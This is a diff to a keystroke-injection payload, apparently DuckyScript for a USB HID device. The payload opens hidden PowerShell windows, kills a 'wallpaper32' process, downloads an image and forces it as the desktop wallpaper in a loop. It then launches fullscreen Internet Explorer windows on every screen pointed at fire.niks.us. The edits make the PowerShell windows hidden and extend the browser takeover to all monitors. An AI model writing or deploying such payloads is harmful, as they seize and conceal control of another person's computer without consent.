@@ -1,21 +1,22 @@
 GUI r
 DELAY 1500
-STRING powershell.exe 
+STRING powershell.exe -windowstyle hidden 
 ENTER
 DELAY 3000
 STRING Stop-Process -name wallpaper32
 ENTER
 DELAY 2000
-STRING iwr -Uri https://i.imgur.com/bGxXHLY.jpg -OutFile c:\Users\$env:UserName\b.jpg;sp 'HKCU:Control Panel\Desktop' -name WallPaper -value "c:\Users\$env:UserName\b.jpg"; sp 'HKCU:Control Panel\Desktop' -name WallPaperStyle -value "6";$a=1;do{RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)
+STRING iwr -Uri https://i.imgur.com/bGxXHLY.jpg -OutFile c:\Users\$env:UserName\b.jpg;sp 'HKCU:Control Panel\Desktop' -name WallPaper -value "c:\Users\$env:UserName\b.jpg"; sp 'HKCU:Control Panel\Desktop' -name WallPaperStyle -value "6";$a=1;do{RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59);exit
 ENTER
-DELAY 1000
+DELAY 5000
 GUI d
-DELAY 500
+DELAY 700
 GUI r
 DELAY 1500
-STRING https://fire.niks.us
-DELAY 1500
+STRING powershell.exe -windowstyle hidden
 ENTER
 DELAY 3000
-F11
-DELAY 1500
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING [System.Windows.Forms.Screen]::AllScreens |foreach {$_;$screen_x = $_.WorkingArea.X;$screen_y = $_.WorkingArea.Y;$ie = New-Object -ComObject InternetExplorer.Application;$ie.Left = $screen_x;$ie.Top = $screen_y;$ie.FullScreen = $true;$ie.navigate("https://fire.niks.us");$ie.Visible=$true;$ie.Toolbar=$true};exit
+ENTER
